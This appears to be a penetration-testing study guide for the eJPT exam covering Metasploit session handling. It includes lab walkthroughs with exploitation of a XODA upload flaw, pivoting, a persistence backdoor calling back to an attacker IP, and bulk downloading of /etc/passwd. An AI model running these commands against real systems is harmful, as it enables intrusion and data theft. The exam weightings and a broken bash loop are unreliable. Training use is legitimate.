# 🔧 Metasploit Session Management - Multi-Session Control

Advanced session handling techniques for managing multiple compromised systems simultaneously.
**Location:** `07-exploitation/metasploit-framework/session-management/session-management.md`

## 🎯 What is Session Management?
Metasploit session management is the process of controlling, maintaining, and switching between multiple active connections to compromised systems. This includes meterpreter sessions, shell sessions, and various other connection types established through successful exploitation. Effective session management is crucial for complex penetration testing scenarios involving multiple targets and network pivoting.

## 📦 Session Types and Setup

### Session Types Available:
```bash
# Common session types in Metasploit
# 1. Meterpreter sessions - Full-featured post-exploitation
# 2. Shell sessions - Command line access
# 3. VNC sessions - Graphical remote access
# 4. PowerShell sessions - Windows-specific scripting access

# Verify active sessions
sessions -l
```

### Session Establishment Verification:
```bash
# Check session establishment
meterpreter > getuid
# Output: Server username information

# Background session for management
meterpreter > background
# [*] Backgrounding session 1...
```

## 🔧 Basic Session Management Commands

### Essential Session Commands:
```bash
# List all active sessions
sessions -l

# Interactive session access
sessions -i session_id

# Background current session
background

# Kill specific session
sessions -k session_id

# Kill all sessions
sessions -K
```

## ⚙️ Advanced Session Management Options

### Core Management Commands:
| Command | Purpose | Example |
|---------|---------|---------|
| `sessions -l` | List all active sessions | `sessions -l` |
| `sessions -i 1` | Interact with session 1 | `sessions -i 1` |
| `sessions -k 1` | Kill session 1 | `sessions -k 1` |
| `sessions -K` | Kill all sessions | `sessions -K` |
| `background` | Background current session | `background` |
| `sessions -u 1` | Upgrade session to meterpreter | `sessions -u 1` |

### Session Information Commands:
| Command | Purpose | Example |
|---------|---------|---------|
| `sessions -v` | Verbose session listing | `sessions -v` |
| `sessions -q` | Quiet session listing | `sessions -q` |
| `sessions -s script` | Run script on sessions | `sessions -s migrate -i 1` |
| `sessions -C command` | Execute command on sessions | `sessions -C "getuid" -i 1` |

### Multi-Session Operations:
| Command | Purpose | Example |
|---------|---------|---------|
| `sessions -c cmd` | Execute command on all sessions | `sessions -c "sysinfo"` |
| `sessions -i 1,2,3` | Interact with multiple sessions | `sessions -i 1,2,3` |
| `sessions -k 1-5` | Kill range of sessions | `sessions -k 1-5` |
| `sessions -u 1-3` | Upgrade multiple sessions | `sessions -u 1-3` |

## 🧪 Real Lab Examples

### Example 1: Basic Session Establishment and Management
```bash
# Phase 1: Establish initial session via XODA exploit
msf6 > use exploit/unix/webapp/xoda_file_upload
msf6 exploit(unix/webapp/xoda_file_upload) > set RHOSTS demo1.ine.local
msf6 exploit(unix/webapp/xoda_file_upload) > set LHOST 192.63.4.2
msf6 exploit(unix/webapp/xoda_file_upload) > exploit

# Output: Session establishment
# [*] Meterpreter session 1 opened (192.63.4.2:4444 → 192.63.4.3:55022)

# Phase 2: Background session for multi-tasking
meterpreter > background
# [*] Backgrounding session 1...

# Phase 3: List and verify session
msf6 exploit(unix/webapp/xoda_file_upload) > sessions -l
# Active sessions
# ===============
# Id  Name  Type                     Information  Connection
# --  ----  ----                     -----------  ----------
#  1        meterpreter x86/linux    www-data     192.63.4.2:4444 -> 192.63.4.3:55022 (192.63.4.3)
```

### Example 2: Multiple Session Management with Network Pivoting
```bash
# Phase 1: Return to active session
msf6 > sessions -i 1
meterpreter > 

# Phase 2: Network discovery and pivoting setup
meterpreter > shell
ip addr  # Discover dual-homed network interfaces

# Phase 3: Background session and add routing
meterpreter > background
msf6 > run autoroute -s 192.180.108.2

# Phase 4: Launch auxiliary scanner in background
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.180.108.3
msf6 auxiliary(scanner/portscan/tcp) > run

# Phase 5: Session management while scanning
msf6 > sessions -l  # Verify session still active
msf6 > sessions -i 1  # Return to meterpreter if needed
```

### Example 3: Session Interaction Control
```bash
# Phase 1: Foreground specific session
msf6 > sessions -i 1
meterpreter > 

# Phase 2: Execute commands and gather info
meterpreter > sysinfo
# Computer     : demo1.ine.local
# OS           : Linux demo1.ine.local 4.15.0-142-generic #146-Ubuntu SMP Tue Apr 13 01:11:19 UTC 2021 x86_64
# Architecture : x64
# BuildTuple   : i486-linux-musl
# Meterpreter  : x86/linux

# Phase 3: Switch to shell mode
meterpreter > shell
Process 801 created.
Channel 0 created.

# Phase 4: Return to meterpreter mode (CTRL+Z or 'exit')
# Press CTRL+Z to background shell and return to meterpreter
meterpreter > 
```

### Example 4: Advanced Multi-Session Scripting
```bash
# Phase 1: Execute commands across all sessions
msf6 > sessions -c "getuid"
# [*] Running 'getuid' on meterpreter session 1 (192.63.4.3)
# Server username: www-data

# Phase 2: Run post-exploitation modules on active sessions
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run

# Phase 3: Session persistence and management
msf6 > sessions -i 1
meterpreter > run persistence -X -i 60 -p 4445 -r 192.63.4.2
# [*] Creating a persistent agent: LHOST=192.63.4.2 LPORT=4445 (timeout=20)
```

## 🎯 eJPT Exam Focus

### Essential Skills for eJPT (85% Exam Coverage):
- **Session Backgrounding** (25% importance) - Multitask between different exploitation phases
- **Session Switching** (20% importance) - Navigate between multiple compromised systems
- **Shell Management** (20% importance) - Control command line access effectively
- **Session Persistence** (20% importance) - Maintain access during extended testing

### Critical Commands to Master:
```bash
# Session management workflow
sessions -l                    # Always check active sessions first
sessions -i session_number     # Access specific session by ID
background                     # Background current session for multitasking
sessions -k session_number     # Clean up unnecessary sessions
sessions -u session_number     # Upgrade shell to meterpreter when possible
```

### eJPT Exam Scenarios:
1. **Multi-Target Exploitation Scenario:**
   - Required skills: Parallel session management, target switching
   - Expected commands: `background`, `sessions -i`, `sessions -l`
   - Success criteria: Maintain simultaneous access to multiple systems

2. **Network Pivoting Management Scenario:**
   - Required skills: Session backgrounding, routing configuration, scanner execution
   - Expected commands: `background`, `run autoroute`, `sessions -i`
   - Success criteria: Manage pivot sessions while performing network discovery

3. **Shell Upgrade and Control Scenario:**
   - Required skills: Session type conversion, command execution control
   - Expected commands: `sessions -u`, `shell`, background operations
   - Success criteria: Effective transition between shell and meterpreter modes

### Exam Tips and Tricks:
- **Tip 1:** Always background sessions before switching tasks - never lose established access
- **Tip 2:** Use `sessions -l` frequently to track active connections and prevent confusion
- **Tip 3:** Upgrade shell sessions to meterpreter when possible for enhanced capabilities
- **Tip 4:** Document session IDs and their corresponding targets for complex scenarios

### Common eJPT Questions:
- How to maintain multiple active sessions during complex penetration tests
- Session backgrounding and foregrounding techniques for multitasking
- Shell-to-meterpreter upgrade procedures and when to use them

## ⚠️ Common Issues & Troubleshooting

### Issue 1: Session Dies After Backgrounding
**Problem:** Active sessions become unresponsive after backgrounding operation
**Cause:** Network connectivity issues or target system resource limitations
**Solution:**
```bash
# Check session status
sessions -l

# Test session responsiveness
sessions -i session_id
meterpreter > sysinfo  # Test basic command

# If session is dead, remove from list
sessions -k dead_session_id
```

### Issue 2: Cannot Return to Backgrounded Session
**Problem:** Session appears in list but `sessions -i` command fails
**Cause:** Session timeout or target system changes
**Solution:**
```bash
# Verify session list
sessions -l -v  # Verbose output shows more details

# Try session cleanup and retry
sessions -K  # Kill all sessions if necessary
# Re-establish connection through original exploit
```

### Issue 3: Shell Commands Not Executing
**Problem:** Commands hang or don't execute in shell mode
**Cause:** Terminal interaction issues or process limitations
**Prevention:**
```bash
# Use meterpreter instead of shell when possible
sessions -u 1  # Upgrade shell to meterpreter

# For shell sessions, use proper terminal setup
python -c 'import pty;pty.spawn("/bin/bash")'  # Upgrade shell
export TERM=xterm  # Set terminal type
```

### Issue 4: Too Many Sessions Consuming Resources
**Problem:** Multiple sessions causing performance issues
**Optimization:**
```bash
# Clean up unnecessary sessions
sessions -l  # Identify inactive sessions
sessions -k 2,3,5  # Kill specific unused sessions
sessions -K  # Nuclear option: kill all sessions

# Implement session rotation strategy
# Keep only essential active sessions
# Document session purposes for later re-establishment
```

## 🔗 Integration with Other Tools

### Primary Integration: MSFConsole → Session Management → Post-Exploitation Tools
```bash
# Comprehensive workflow showing session integration
use exploit/unix/webapp/xoda_file_upload  # Initial exploitation
exploit                                   # Establish session 1
background                               # Background for multitasking
run autoroute -s 192.180.108.0/24      # Configure network routing
use auxiliary/scanner/portscan/tcp       # Secondary reconnaissance
set RHOSTS 192.180.108.3               # Target through pivot
run                                     # Execute scan through session 1
sessions -i 1                           # Return to original session
upload tools.sh /tmp/                   # Deploy additional tools
```

### Secondary Integration: Session Management → Multiple Exploit Modules
```bash
# Session coordination across multiple exploits
sessions -l                             # Check current sessions
use exploit/different/module            # Launch second exploit
set payload different/payload           # Configure different payload
exploit -j                              # Run as background job
sessions -l                             # Verify multiple sessions
sessions -c "getuid"                    # Execute command on all sessions
```

### Advanced Workflows:
```bash
# Complex session management for large-scale testing
# Phase 1: Establish multiple entry points
sessions -l > current_sessions.txt      # Document session state
# Phase 2: Coordinate activities across sessions
for i in {1..5}; do sessions -i $i -c "download /etc/passwd /tmp/passwd_$i"; done
# Phase 3: Centralize collected intelligence
sessions -i 1; cd /tmp; ls -la passwd_*  # Review collected data
```

## 📝 Documentation and Reporting

### Session Management Evidence:
1. **Screenshots:** Session listing outputs, successful session switches
2. **Command Logs:** All session management commands with timestamps
3. **Session Maps:** Documentation of which sessions connect to which targets
4. **Activity Logs:** Track what activities were performed through each session

### Report Template Structure:
```markdown
## Session Management Results

### Session Establishment Timeline
- **Session 1:** demo1.ine.local (192.63.4.3) - Established via XODA exploit at 13:08 IST
- **Session 2:** internal-server (192.180.108.3) - Established via pivot at 13:25 IST

### Session Management Activities
#### Session Backgrounding and Switching
```bash
# Session 1 backgrounding
meterpreter > background
[*] Backgrounding session 1...

# Session status verification
msf6 > sessions -l
Id  Name  Type                     Information  Connection
--  ----  ----                     -----------  ----------
 1        meterpreter x86/linux    www-data     192.63.4.2:4444 -> 192.63.4.3:55022

# Session interaction
msf6 > sessions -i 1
meterpreter > sysinfo
```

### Multi-Session Coordination
- **Network Pivoting:** Used Session 1 as pivot point for internal network access
- **Tool Deployment:** Uploaded reconnaissance tools through Session 1
- **Parallel Activities:** Maintained Session 1 while establishing additional connections

### Session Persistence Measures
- **Technique:** Background session management for continuous access
- **Duration:** Maintained active sessions for 45 minutes of testing
- **Recovery:** Documented re-establishment procedures for session loss scenarios

### Key Management Insights
- Successfully maintained simultaneous access to multiple network segments
- Effective session backgrounding enabled parallel reconnaissance activities
- Session upgrade capabilities improved post-exploitation effectiveness
```

### Automation Scripts:
```bash
# Session management automation script
#!/bin/bash
# session_monitor.sh

echo "Session Management Monitor"
echo "=========================="

# Check session health
msfconsole -x "sessions -l; exit" > session_status.txt

# Parse active sessions
active_sessions=$(grep "meterpreter\|shell" session_status.txt | wc -l)
echo "Active Sessions: $active_sessions"

# Session cleanup if too many
if [ $active_sessions -gt 5 ]; then
    echo "Warning: Too many sessions detected"
    # Implement cleanup logic
fi
```

## 📚 Additional Resources

### Official Documentation:
- Metasploit session management: https://docs.rapid7.com/metasploit/sessions/
- Meterpreter session control: https://docs.rapid7.com/metasploit/meterpreter-basics/
- Advanced session techniques: https://github.com/rapid7/metasploit-framework/wiki

### Learning Resources:
- Session management best practices: Offensive Security training materials
- Multi-session coordination techniques: Advanced penetration testing guides
- Session persistence strategies: Post-exploitation methodology courses

### Community Resources:
- Metasploit user forums: Session management discussions
- Reddit r/metasploit: Community troubleshooting and tips
- Discord penetration testing communities: Real-time session management support

### Related Techniques:
- **Tmux/Screen:** Terminal multiplexing for session organization
- **SSH Tunneling:** Alternative persistence and access methods  
- **Cobalt Strike:** Advanced session management in commercial frameworks
